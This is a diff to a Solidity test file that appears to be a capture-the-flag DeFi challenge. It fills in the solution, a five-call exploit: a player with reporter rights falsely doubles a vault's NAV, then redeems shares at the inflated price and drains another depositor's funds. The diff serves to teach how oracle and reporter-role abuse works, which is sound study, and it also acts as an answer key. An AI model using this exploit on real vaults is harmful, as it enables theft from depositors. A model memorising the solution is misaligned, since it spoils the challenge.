@@ -109,7 +109,33 @@ contract FalseNavChallenge is Test {
         // Remember the queue: to be paid you must first subscribe (for shares), enqueue those
         // shares to lock a payout at today's NAV, and then settle and claim.
         //
-        // TODO: your code goes here
+        // The route (five calls, no code changed, nothing hacked — a number was typed in):
+        //
+        //   buy at the honest price, re-mark the book, sell at the dishonest price, and let
+        //   the queue pay the difference.
+
+        // 1) Buy shares at the HONEST price (NAV = 1.00): 1000 USDC -> 1000 shares.
+        usdc.approve(address(vault), INITIAL_PLAYER_BALANCE);
+        vault.subscribe(INITIAL_PLAYER_BALANCE);
+
+        // 2) Re-mark the book. The player holds REPORTER_ROLE, so one typed-in number
+        //    doubles the NAV to 2.00 per share. Nothing off-chain changed; the custodian
+        //    still holds nothing. This is the same lie from the opening-minute demo.
+        vault.attest(int256(2 * PAR)); // NAV 2.00e8
+
+        // 3) Sell at the DISHONEST price. enqueue() locks the payout at today's (lied) NAV,
+        //    so the 1000 shares now claim 2000 USDC: 1000e18 * 2e8 / 1e20 = 2000e6.
+        tBill.approve(address(queue), 1_000e18);
+        queue.enqueue(1_000e18);
+
+        // 4) Settle out of the vault's buffer. It holds 2000 USDC — Alice's honest 1000 plus
+        //    the player's own 1000 — exactly enough to honour the inflated ticket, then claim.
+        queue.settle(2_000e6);
+        queue.claim();
+
+        // Outcome: the player paid in 1000 and walks away with 2000 (net +1000). The vault's
+        // buffer is empty and the queue holds nothing, yet Alice's 1000 shares still read as a
+        // 2000-USDC claim on a book that is now empty. The reporter's key became cash.
     }
 
     ////////////////////////////////////////////////////////////////////////
